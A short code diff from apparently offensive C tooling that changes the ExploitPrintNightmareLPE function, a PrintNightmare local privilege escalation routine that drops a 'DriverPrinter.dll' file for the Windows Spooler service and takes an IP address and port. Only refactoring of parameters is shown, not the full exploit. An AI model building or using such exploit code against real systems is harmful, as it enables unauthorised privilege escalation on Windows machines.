@@ -116,7 +116,7 @@ DWORD WINAPI ThreadPipeServer(LPVOID lpvParam){
 	return -1;
 }
 
-BOOL ExploitPrintNightmareLPE(Advapi32_API advapi32, char* PathExeToRun, WCHAR* UipAddress, char* port, char* wincatDefaultDir){
+BOOL ExploitPrintNightmareLPE(Kernel32_API kernel32, Advapi32_API advapi32,  Cabinet_API cabinetAPI, char* PathExeToRun, WCHAR* UipAddress, char* port, char* wincatDefaultDir){
 	const char* dllName = "DriverPrinter.dll";
 	const char* serviceName = "Spooler";
 
@@ -134,8 +134,8 @@ BOOL ExploitPrintNightmareLPE(Advapi32_API advapi32, char* PathExeToRun, WCHAR* 
 		printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Fail to save info in reg (Path)");
 		return FALSE;
 	}*/
-
-	if (DropDllFile(wincatDefaultDir, (char*)dllName)){
+	
+	if (DropDllFile(kernel32, cabinetAPI, wincatDefaultDir, (char*)dllName)){
 		DWORD dwThreadId = 0;
 		HANDLE hThread;
 
